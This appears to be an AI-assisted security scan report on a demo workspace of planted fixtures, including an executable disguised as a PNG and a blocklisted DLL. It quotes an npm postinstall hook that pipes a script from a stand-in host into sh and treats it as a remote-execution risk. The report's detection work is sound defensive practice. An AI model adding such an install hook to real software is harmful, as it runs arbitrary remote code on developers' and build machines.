# DevShield Report

**Generated:** 2026-09-27T00:00:00Z  
**Scan ID:** scan-2026-09-26-717  
**Workspace:** `C:\Users\soury\OneDrive\DevShield\demo-workspace`  
**Baseline approved:** 2026-09-26T07:26:21Z (11 files tracked)

> ⚠️ **AI-assisted risk assessment. Not a definitive malware verdict.**  
> Review findings carefully before approving quarantine or baseline.

---

## Scan Summary

| Metric | Value |
|--------|-------|
| Total files | 19 |
| New files | 8 |
| Modified files | 1 |
| Unchanged (skipped) | 10 |
| Analyzed | 9 |
| HIGH findings | 2 |
| MEDIUM findings | 1 |
| LOW findings | 6 |
| Scan duration | **34 ms** |

**Incremental scan story:** 11 trusted baseline files were skipped entirely. Only the 9 new/modified files were sent to the analyzer — full coverage in 34 ms.

---

## Risk Summary

| Risk | Count | Recommended Action |
|------|-------|--------------------|
| HIGH | 2 | Quarantine or explain before build |
| MEDIUM | 1 | Review before build |
| LOW | 6 | Allow — no action needed |

---

## All Changed Files

| File | Change | Risk | Score | Key Signals | Recommendation |
|------|--------|------|-------|-------------|----------------|
| `assets/logo.png` | NEW | **HIGH** | 100 | `known_bad_hash`, `magic_mismatch` | QUARANTINE |
| `src/lib/tool.dll` | NEW | **HIGH** | 100 | `known_bad_hash`, `binary_in_source_dir` | QUARANTINE |
| `vendor/helper/package.json` | NEW | MEDIUM | 30 | `install_script` | REVIEW |
| `docs/invoice.pdf.exe` | NEW | LOW | 25 | `double_extension` | ALLOW |
| `src/utils/loader.js` | NEW | LOW | 20 | `obfuscated_code` | ALLOW |
| `vendor/requirements_fixture.txt` | NEW | LOW | 25 | `non_registry_dependency` | ALLOW |
| `src/NewFeature.java` | NEW | LOW | 0 | — | ALLOW |
| `vendor/helper/README.md` | NEW | LOW | 0 | — | ALLOW |
| `README.md` | MODIFIED | LOW | 0 | — | ALLOW |

---

## Dependency Review

| File | Dependency / Script | Source / Value | Verdict | Reason |
|------|---------------------|----------------|---------|--------|
| `vendor/helper/package.json` | postinstall script | `curl https://example.invalid/setup.sh \| sh` | **QUARANTINE** | Remote script execution via shell; arbitrary code execution risk; high-confidence `install_script` signal |
| `vendor/requirements_fixture.txt` | suspicious-pkg | `git+https://example.invalid/pkg.git#egg=suspicious-pkg` | REVIEW | Non-registry git source; unvalidated origin; requires verification of repository ownership and integrity |

### Dependency Review Notes

The two NEW manifests present distinct supply-chain risks. `vendor/helper/package.json` contains a postinstall script that downloads and executes arbitrary shell code from an external URL — a direct arbitrary code execution vector flagged by the `install_script` signal. `vendor/requirements_fixture.txt` specifies a Python dependency from a non-registry git source, which bypasses standard package registry verification and vetting; while not immediately executable like the npm script, git-based dependencies present provenance and tampering risks. Both files warrant intervention before inclusion in the supply chain.

---

## Configuration and File Review

| File | Change | Verdict | Reason |
|------|--------|---------|--------|
| `README.md` | MODIFIED | ALLOW | Content duplication (title repeated, reference to generate_fixtures.py) is benign metadata update, no execution hooks or external links |
| `vendor/helper/README.md` | NEW | REVIEW | Explicit warning about intentionally suspicious postinstall script; postinstall behavior must be validated in package.json |
| `src/NewFeature.java` | NEW | ALLOW | Harmless test fixture: simple class with static print method, no network calls, reflection, exec, or external I/O |
| `config/app.yml` | UNCHANGED | ALLOW | Baseline reference only; standard server config, no external pulls or dynamic execution |

### Config Review Notes

No security-critical changes detected in config or CI files. README.md modifications are minor metadata updates. `vendor/helper/README.md` flags an intentionally suspicious postinstall script for testing — this requires visual confirmation that the postinstall entry in `package.json` is not production code. `NewFeature.java` is a trivial test class. No CI/CD injection vectors, external downloads, or privilege escalation patterns observed.

---

## Findings Analysis

### [HIGH] `assets/logo.png` — score 100/100

**Signals:**
- `known_bad_hash` (weight: 100) — SHA-256 `014b8ce9…` matches the local blocklist. This file is a known unsafe binary.
- `magic_mismatch` (weight: 35) — The file's header bytes are `MZ` (Windows PE executable magic), but the extension is `.png`. Classic obfuscation: disguise an executable as an image.

**Why this is critical:** A hash-confirmed malicious binary is being introduced disguised as a PNG image. It is 64 bytes — far too small for any real image. The combination of blocklist hit + magic mismatch provides high-confidence identification. This file should never reach a build or be committed.

**Recommended action: QUARANTINE**  
> Quarantine requires explicit developer confirmation — do not proceed automatically.

---

### [HIGH] `src/lib/tool.dll` — score 100/100

**Signals:**
- `known_bad_hash` (weight: 100) — Same SHA-256 `014b8ce9…` as `assets/logo.png`. Same blocked binary.
- `binary_in_source_dir` (weight: 20) — A `.dll` binary committed directly into `src/lib/`. Source directories should contain source code, not pre-compiled binaries.

**Why this is critical:** The identical hash as `logo.png` means the same payload is being delivered twice under different names and locations — a pattern consistent with a supply-chain compromise attempting redundant delivery. Real Windows DLLs are kilobytes to megabytes; 64 bytes is not a legitimate DLL. Build systems and IDEs can silently load DLLs from source directories.

**Recommended action: QUARANTINE**  
> Quarantine requires explicit developer confirmation — do not proceed automatically.

---

### [MEDIUM] `vendor/helper/package.json` — score 30/100

**Signal:**
- `install_script` (weight: 30) — `postinstall` script: `curl https://example.invalid/setup.sh | sh`

**What this means:** Any developer or CI pipeline that runs `npm install` in this directory will automatically download and execute an arbitrary shell script from an external URL, without checksums or signatures. This is one of the most common supply-chain attack vectors.

**Why this is concerning:** The script is fetched from an unverified external source and piped directly to `sh`. A compromised URL could execute any code on the developer's machine or build agent. There is no checksum, no signature, no pinned version.

**Recommended action: REVIEW**  
> Review the `postinstall` content. Replace with a local committed script if legitimate, or remove entirely. Do not run `npm install` in `vendor/helper/` until resolved.

---

## Developer Actions Required

- [ ] **[HIGH] `assets/logo.png`** — Known-bad hash + disguised PE binary. **Quarantine?** (requires your confirmation)
- [ ] **[HIGH] `src/lib/tool.dll`** — Known-bad hash + binary in source dir. Same payload as logo.png. **Quarantine?** (requires your confirmation)
- [ ] **[MEDIUM] `vendor/helper/package.json`** — Remote-execution postinstall script. Review and remove or replace with a local script before allowing `npm install`.
- [ ] **[LOW] `vendor/requirements_fixture.txt`** — Non-registry git dependency. Verify the git URL is intentional and the repo is trusted.

---

## Next Steps

1. Review each action item above.
2. To quarantine a file, say: **"Quarantine [file path]"** — I will ask for your explicit confirmation before acting.
3. To approve the baseline once all findings are resolved, say: **"Approve baseline"** — I will confirm with you before acting.
4. After baseline approval, any future scan of unchanged files will return in milliseconds.

---

*AI-assisted risk assessment, not a malware verdict. DevShield reads file bytes only — it never executes scanned files.*  
*Generated by DevShield + IBM Bob parallel subagent workflow.*
